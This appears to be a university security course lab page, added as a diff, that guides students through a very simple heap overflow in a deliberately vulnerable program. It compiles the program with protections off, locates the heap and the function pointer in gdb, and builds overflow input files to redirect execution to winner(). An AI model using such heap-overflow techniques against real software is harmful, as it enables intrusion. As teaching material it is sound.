@@ -1,0 +1,274 @@
+<html>
+<head>
+<title>Proj 7: Very Simple Heap Overflow (10 pts.)</title>
+</head>
+<body bgcolor="#cccccc">
+<h1>Proj 7: Very Simple Heap Overflow (10 pts.)</h1>
+<h2>What You Need</h2>
+A 32-bit x86 Kali Linux machine, real or virtual. The project was
+written on Kali 2.
+<h2>Purpose</h2>
+To practice exploiting a very simple heap overflow vulnerability.
+This one is easy to exploit because there's a pointer in
+the heap that is used for a function call. That makes a
+heap overflow as simple as a stack overflow targeting EIP.
+<h2>Creating a Vulnerable Program</h2>
+This program just echoes back text
+from its command-line argument.
+<p>
+In Kali, in a Terminal window, execute
+these commands:
+<blockquote><pre><code><big><b><pre>
+curl https://samsclass.info/127/proj/heap0.c > heap0.c
+gcc heap0.c -w -g -no-pie -z execstack -o heap0
+./heap0 HELLO
+./heap0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</pre></b></big></code></pre></blockquote>
+As shown below, running the program with "HELLO" works,
+showing a "level has not been passed" message,
+but running it with 90 'A' characters causes a "Segmentation
+fault".
+<p><img src="p7-heap1.png"><p>
+<h2>Examining the Source Code</h2>
+In Kali, in a Terminal window, execute
+these commands:
+<blockquote><pre><code><big><b>
+nano heap0.c
+</b></big></code></pre></blockquote>
+As shown below,
+two objects are defined
+(called "data structures"), which
+will be stored in a portion of memory called
+a "heap".
+<p>
+The first object is <b>name[64]</b>, which has
+enough space for 64 characters.
+<p>
+Then comes <b>fp</b>, which holds a 4-byte pointer--that
+is, a RAM address.
+<p>
+Finally, there's a function named <b>winner()</b>.
+As you might expect, our goal is to execute
+that function.
+<p><img src="p7-heap5.png"><p>
+Scroll down to see the rest of heap0.c,
+as shown below.
+<p>
+<p><img src="p7-heap4.png"><p>
+Close the file with <b>Ctrl+X</b>.
+<p>
+<h2>Observing the Heap</h2>
+Execute these commands to
+run the program in the gdb debugger,
+place a breakpoint, run it with a
+short input string,
+and examine the
+process map:
+<blockquote><pre><code><big><b><pre>
+gdb ./heap0
+list 25,40
+b 38
+run AAAA
+info proc map
+</pre></b></big></code></pre></blockquote>
+Find the heap. When I did it,
+the heap was the fourth item on the list,
+starting at 0x804b000, as shown below.
+<p><img src="p7-heap23.png"><p>
+<p>
+Execute this instruction to see the
+contents of the heap, replacing the
+address with the correct address of the
+heap on your system.
+<blockquote><pre><code><big><b>
+x/120x 0x804b000
+</b></big></code></pre></blockquote>
+Find
+"0x41414141" on the heap, as shown below.
+You may have to press Enter to see more pages
+of memory to find it on your system.
+<p>
+As highlighted below, two values are stored on
+the heap: "0x41414141" is 'AAAA', and
+a short distance after that there's an address,
+which was 0x080484c1 when I did it.
+<p>
+<p><img src="p7-heap24.png"><p>
+<p>
+Execute this instruction to disassemble
+the function "nowinner".
+<blockquote><pre><code><big><b>
+disassemble nowinner
+</b></big></code></pre></blockquote>
+As shown below, this function starts at
+the address stored on the heap:
+0x080484c1 on my system.
+<p>
+<p><img src="p7-heap25.png"><p>
+Execute these instructions to exit the
+debugger.
+<blockquote><pre><code><big><b><pre>
+q
+y
+</pre></b></big></code></pre></blockquote>
+<h2>Observing a Crash</h2>
+In Kali, in a Terminal window, execute this
+command:
+<blockquote><pre><code><big><b>
+nano h1
+</b></big></code></pre></blockquote>
+Enter this code, as shown below:
+<blockquote><pre><code><big><b>
+#!/usr/bin/python
+
+print 'A' * 90
+</b></big></code></pre></blockquote>
+<p><img src="p7-heap26.png"><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+<p>
+Execute these commands to make the file
+executable, test it, and send it to
+heap0:
+<blockquote><pre><code><big><b>
+chmod a+x h1
+./h1
+./heap0 $(./h1)
+</b></big></code></pre></blockquote>
+<p><img src="p7-heap9.png"><p>
+90 characters are enough to crash
+the program.
+<h2>Controlling the EIP</h2>
+Execute these commands to
+make a modified attack file,
+to find out what characters ended up
+in $eip.
+<blockquote><pre><code><big><b>
+cp h1 h2
+nano h2
+</b></big></code></pre></blockquote>
+Modify the file to send only 70 'A'
+characters followed by 20 bytes in a
+nonrepeating pattern, as shown
+below.
+<p><img src="p7-heap27.png"><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+<h2>Debugging the Program</h2>
+Execute these commands to
+run the program in the gdb debugger,
+send the attack to it, and examine
+the registers.
+<blockquote><pre><code><big><b>
+gdb -q ./heap0
+run $(./h2)
+info registers
+q
+y
+</b></big></code></pre></blockquote>
+As shown below, the program crashes with
+$eip = 0x36303530, or the ASCII text
+'0506'.
+<p><img src="p7-heap28.png"><p>
+On my system, the characters before
+the EIP were 70 "A"s + '0001020304'
+for a total of 80 characters.
+<h2>Targeting the EIP</h2>
+Execute these commands to
+make an modified attack program
+that attempts to put 'BCDE' into the
+EIP.
+<blockquote><pre><code><big><b>
+cp h2 h3
+nano h3
+</b></big></code></pre></blockquote>
+Modify the file as shown
+below.
+<p><img src="p7-heap29.png"><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+<h2>Debugging the Program</h2>
+Execute these commands to
+run the program in the gdb debugger,
+send the attack to it, and examine
+the registers.
+<blockquote><pre><code><big><b>
+gdb -q ./heap0
+run $(./h3)
+info registers
+</b></big></code></pre></blockquote>
+As shown below, the program crashes with
+$eip = 0x45444342, or the ASCII text
+'BCDE'.
+<p><img src="p7-heap30.png"><p>
+<h2>Finding an Address to Inject</h2>
+Execute these commands to
+disassemble the winner()
+function.
+<blockquote><pre><code><big><b>
+disassemble winner
+q
+y
+</b></big></code></pre></blockquote>
+As shown below, the function started
+at address <b>0x08048496</b> on my system. Your
+address may be different--use the
+address you see on your screen.
+<p><img src="p7-heap31.png"><p>
+<h2>The Final Exploit File</h2>
+Execute these commands to
+make another attack program
+that puts <b>0x08048496</b> into the
+EIP.
+<blockquote><pre><code><big><b>
+cp h3 h4
+nano h4
+</b></big></code></pre></blockquote>
+Modify the file as shown
+below.
+<p><img src="p7-heap32.png"><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+<h2>Testing the Exploit</h2>
+Execute this command:
+<blockquote><pre><code><big><b>
+./heap0 $(./h4)
+</b></big></code></pre></blockquote>
+You should see the "<b>level passed</b>"
+message, as shown below.
+<p><img src="p7-heap16.png"><p>
+<h2>Saving a Screen Image</h2>
+Make sure the "<b>level passed</b>"
+message is visible,
+as shown above.
+<p>
+Click on the host system's desktop to make it
+active.
+<p>
+Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
+<p>
+<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
+<p>
+Paste the image into Paint.
+<p>
+Save the document with the filename "<b>YOUR NAME Proj 7</b>", replacing "YOUR NAME" with your real name.
+<h2>Turning in your Project</h2>
+Email the image
+to <b>cnit.127sam@gmail.com</b> with the subject line:
+<b>Proj 7 from YOUR NAME</b>
+<h2>Sources</h2>
+<a href="https://www.vulnhub.com/series/exploit-exercises,11/#">
+https://www.vulnhub.com/series/exploit-exercises,11/#</a>
+<p>
+<a href="https://csg.utdallas.edu/wp-content/uploads/2012/08/Heap-Based-Exploitation.pdf">
+https://csg.utdallas.edu/wp-content/uploads/2012/08/Heap-Based-Exploitation.pdf</a>
+<p>
+<a href="https://www.mattandreko.com/2012/01/10/exploit-exercises-heap-0/">
+https://www.mattandreko.com/2012/01/10/exploit-exercises-heap-0/</a>
+<hr>
+Posted 9-17-15 by Sam Bowne<br>
+Revised 9-28-15 <br>
+Revised for Kali 2018.1 2-22-18 <br>
+Tested on Kali 2018.3 x86 and it worked fine 9-22-18 <br>
+</body>
+</html>
